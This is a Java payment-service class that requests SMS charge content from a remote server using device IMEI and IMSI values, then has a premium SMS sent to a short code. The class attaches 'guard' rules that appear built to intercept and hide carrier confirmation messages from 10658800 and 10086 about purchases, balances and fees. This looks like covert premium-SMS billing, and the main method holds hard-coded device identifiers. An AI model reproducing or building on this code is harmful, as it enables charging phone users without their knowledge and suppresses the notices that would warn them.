package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.Constants;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.qlzf.commons.helper.MD5Encrypt;

/**
 * http://182.92.21.219:10789/cmcc/mm/single/chargeSMS?pid=xxx&imei=xxx&imsi=xxx&chargeId=xxx&payId=xxx&version=xxxx&channelId=xxx
 * @author leoliu
 *
 */
public class JxMm1DynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(JxMm1DynamicService.class);
	
	private static final String TYPE = "jxMm1";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String DEST = "1065842410";
	
	private static final String REQUESTMODEL = "pid={pid}&imei={imei}&imsi={imsi}&chargeId={chargeId}&payId={payId}&version={version}&channelId={channelId}";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String chargeId = map.get("chargeId");
			String pid = map.get("pid");
			String payId = channel;
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			String version = map.get("version");
			String channelId = map.get("channelId");
			
			String param = REQUESTMODEL.replace("{chargeId}",chargeId).replace("{pid}",pid).replace("{payId}",payId).replace("{version}",version).replace("{imei}",imei).replace("{imsi}",imsi).replace("{channelId}",channelId);
			
			String responseXml = GetData.getData(url, param);
			
			xml = parse(responseXml);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			logger.info(responseXml);
			
				String status = SingleXmlUtil.getNodeValue(responseXml, "status");
			
				if("0".equals(status)){
					try{
						String SMS = SingleXmlUtil.getNodeValue(responseXml, "SMS");
						
						List<Sms> smsList = new ArrayList<Sms>();
						
						Sms sms = new Sms();
						
						sms.setSmsContent(CommonUtil.base64Decode(SMS));
						sms.setSmsDest(DEST);
						sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
						
						smsList.add(sms);
						
						Sms guardSms = new Sms();
						
						List<Guard> guardList = new ArrayList<Guard>();
						
						guardList.add(guard1);
						guardList.add(guard2);
						
						guardList.add(guard3);
						guardList.add(guard4);
						
						guardSms.setGuardList(guardList);
						
						smsList.add(0, guardSms);
							
						return XstreamHelper.toXml(smsList);
					}catch(Exception e){
						
					}
				}
			
		}
		
		return null;
	}
	
	public static void main(String[] args){
		//http://211.154.162.11/recYdmmAction.action?companycode=W1001&pid=ttddz20c&statement=W100120140529174&imsi=460021281243687&imei=863388028868466&mobileip=202.108.36.125&sign=F0B9CB8094C477E328043EBBB9787362
		
		String url = "http://182.92.21.219:10789/cmcc/mm/single/chargeSMS";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a087654321");
		map.put("version", "1.0.0.7");
		map.put("imei", "862594025131367");
		map.put("imsi", "460025399810374");
		map.put("pid", "6504844525-0155454334");
		map.put("chargeId","30000844917015");
		map.put("channelId", "0000000000");
		map.put("appid","300008449170");

		
		System.out.println(new JxMm1DynamicService().dynamic(map));
	}

}
